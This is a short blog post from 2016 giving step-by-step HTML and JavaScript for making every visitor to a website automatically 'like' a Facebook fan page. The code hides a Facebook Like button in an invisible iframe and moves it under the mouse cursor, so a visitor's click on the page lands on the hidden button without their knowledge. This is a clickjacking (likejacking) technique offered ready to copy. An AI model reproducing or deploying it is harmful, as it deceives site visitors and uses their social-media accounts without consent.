---
layout: post
title: "Facebook Fan Page Auto Like - Revised"
date: 2016-07-25 22:47
comments: true
categories: [Facebook]
keywords: facebook, javascript, facebook fan page, facebook fan page auto like
description: Facebook Fan Page auto Like
---

<p>
  <img src="/images/facebook_like.jpg" width="450" alt="Facebook Fan Page Auto Like" />
</p>

<p>
  Due Facebook Graph API was changed/updated so my previous article "<a href="http://geekhmer.github.io/blog/2013/10/02/facebook-fan-page-auto-like" target="_blank">Facebook Fan Page Auto Like</a>" is no longer working. And here is what I revised.
</p>

<p>
  Well, the process is when someone click anywhere on your site they will automatically like your page, no need to put like button.
</p>

<p>
  Follow the step below to make it work:
</p>

<p>
  <strong>1. Put the below code in head tag</strong>
</p>

{% codeblock Check the body are clicked yet lang:html %}
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
<script type="text/javascript">
  var interval = 0;

  function updateActiveElement() {
    if($(document.activeElement).attr('id') == "fb-iframe") {
      clearInterval(interval);
      bodyClicked = true;
    }
  }

  $(function() {
    interval = setInterval("updateActiveElement();", 50);
  });

</script>
{% endcodeblock %}

<p>
  <strong>2. Put the below code in body tag:</strong>
</p>

{% codeblock Load facebook fan page like button & hide it lang:html %}
<div style="overflow: hidden; width: 10px; height: 12px; position: absolute; filter:alpha(opacity=0); -moz-opacity:0.0; -khtml-opacity: 0.0; opacity: 0.0;" id="iframe-wrapper">
  <iframe src="https://www.facebook.com/plugins/like.php?href=https://www.facebook.com/FACEBOOK_PAGE_NAME_URL&send=false&layout=button_count&width=450&show_faces=false&action=like&colorscheme=light&font&height=21&confirm=false" scrolling="no" frameborder="0" style="border:none;overflow:hidden;width:450px;height:21px;" allowTransparency="false"></iframe>
</div>
{% endcodeblock %}

<p>
  And then find FACEBOOK_PAGE_NAME_URL in src iframe and replace it with your facebook fan page url (ex: <a href="http://www.facebook.com/geekhmer" target="_blank">http://www.facebook.com/GeeKhmer</a>).
</p>

<p>
  <strong>3. Put the below code anywhere in html tag:</strong>
</p>

{% codeblock Set mousemove event to body & when body are clicked, it auto click on facebook like button lang:html %}
<script type="text/javascript">
  var bodyClicked = false;
  var iframeWrapper = document.getElementById('iframe-wrapper');
  var standardBody=(document.compatMode=="CSS1Compat") ? document.documentElement : document.body;

  function mouseFollower(e) {
    // for internet explorer
    if (window.event) { 
      iframeWrapper.style.top = (window.event.y-5)+standardBody.scrollTop+'px';
      iframeWrapper.style.left = (window.event.x-5)+standardBody.scrollLeft+'px';
    }
    else {
      iframeWrapper.style.top = (e.pageY-5)+'px';
      iframeWrapper.style.left = (e.pageX-5)+'px';
    }
  }

  document.onmousemove = function(e) {
    if(bodyClicked == false) {
      mouseFollower(e);
    }
  }
</script>
{% endcodeblock %}

<p>
  So far so good, That’s it!!! See ya!!! :)
</p>
